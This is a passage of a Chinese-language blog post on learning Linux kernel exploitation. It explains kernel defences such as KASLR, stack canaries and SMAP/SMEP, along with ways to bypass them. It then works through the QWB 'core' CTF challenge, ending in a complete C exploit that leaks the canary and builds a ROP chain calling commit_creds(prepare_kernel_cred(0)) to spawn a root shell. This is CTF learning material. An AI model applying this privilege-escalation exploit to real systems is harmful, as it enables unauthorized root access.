class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">	    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">	    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">	    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	put_cred_many(old, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(commit_creds);</span><br></pre></td></tr></table></figure>
<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><ol>
<li>KASLR</li>
</ol>
<p>与用户态ASLR类似，在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p>
<ol>
<li>FGKASLR</li>
</ol>
<p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，以函数粒度重新排布内核代码。</p>
<ol>
<li>STACK PROTECTOR</li>
</ol>
<p>类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 kernel panic。内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值。</p>
<ol>
<li>SMAP/SMEP</li>
</ol>
<p>SMAP即管理模式访问保护（Supervisor Mode Access Prevention），SMEP即管理模式执行保护（Supervisor Mode Execution  Prevention），这两种保护通常是同时开启的，用以阻止内核空间直接访问/执行用户空间的数据，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。SMEP保护的绕过有以下两种方式：</p>
<ul>
<li>利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 ret2dir。</li>
<li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel  ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，但对于开启了 KPTI  的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式。</li>
</ul>
<h2 id="入门题目-强网杯core"><a href="#入门题目-强网杯core" class="headerlink" title="入门题目 - 强网杯core"></a>入门题目 - 强网杯core</h2><p>题目附件解开后有如下文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root at mypwn in /ctf/work/kernel-pwn/core</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">bzImage  core.cpio  start.sh  vmlinux</span><br></pre></td></tr></table></figure>
<p>start.sh如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<p>开启了kaslr保护，需要泄露地址。还有要把内存改为128M，要不然可能跑不起来。</p>
<p>首先解压文件系统：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">root at mypwn <span class="keyword">in</span> /ctf/work/kernel-pwn/core</span><br><span class="line">$ cpio -idm &lt; ./core.cpio</span><br><span class="line">cpio: vmlinux not created: newer or same age version exists</span><br><span class="line">104379 blocks</span><br><span class="line"></span><br><span class="line">root at mypwn <span class="keyword">in</span> /ctf/work/kernel-pwn/core</span><br><span class="line">$ ls</span><br><span class="line">bin      core.cpio  etc          init  lib64    proc  sbin      sys  usr</span><br><span class="line">bzImage  core.ko    gen_cpio.sh  lib   linuxrc  root  start.sh  tmp  vmlinux</span><br></pre></td></tr></table></figure>
<p>看下init脚本如下：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">$ cat init</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>可以看到insmod了core.ko，而且把内核中所有用到的符号表给复制到了/tmp/kallsyms下面，并且还开了定时关机，我们本地调试的时候，需要把关机给取消了。</p>
<p>分析程序，发现开了canary和nx：</p>
<p><img src="https://s2.loli.net/2024/02/11/b9mrln7C2FpKZWE.png" alt=""></p>
<p>然后ioctl函数类似于一个菜单，有三个分支可进入：</p>
<p><img src="https://s2.loli.net/2024/02/11/aVASGOgRKNmflTI.png" alt=""></p>
<p>可以看到core_read中有一个溢出点，其中off的值我们可以在别的分支进行控制：</p>
<p><img src="https://s2.loli.net/2024/02/11/jtXl6DwEehui4UW.png" alt=""></p>
<p>core_write有一个大范围的溢出：</p>
<p><img src="https://s2.loli.net/2024/02/11/G6lzrkC2R8eJuj4.png" alt=""></p>
<p>core_copy_func这里存在一个整数溢出：</p>
<p><img src="https://s2.loli.net/2024/02/11/krEsWPVXqZNBb6L.png" alt=""></p>
<p>思路：</p>
<ol>
<li>通过ioctl设置off，然后通过core_read泄露canary</li>
<li>通过core_write写ROP链</li>
<li>通过core_copy_func进行栈溢出进行ROP，最终执行<code>commit_creds(prepare_kernel_cred(0))</code></li>
</ol>
<p>rop链的构造如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>
<p>其中具体的偏移可以通过ropper查找。</p>
<p>exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功提权：</p>
<p><img src="https://s2.loli.net/2024/02/11/7HlkwnqYKZSmFi4.png" alt=""></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/11/kernal-pwn学习/">http://example.com/2024/02/11/kernal-pwn学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel-pwn/">kernel pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2024/02/12/CVE-2017-10271/"><i class="fa fa-chevron-left">  </i><span>CVE-2017-10271：Weblogic &lt; 10.3.6 反序列化分析</span></a></div><div class="next-post pull-right"><a href="/2024/02/07/hackthebox-machine-Devvortex/"><span>假期打靶第四弹-Devvortex</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2025 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>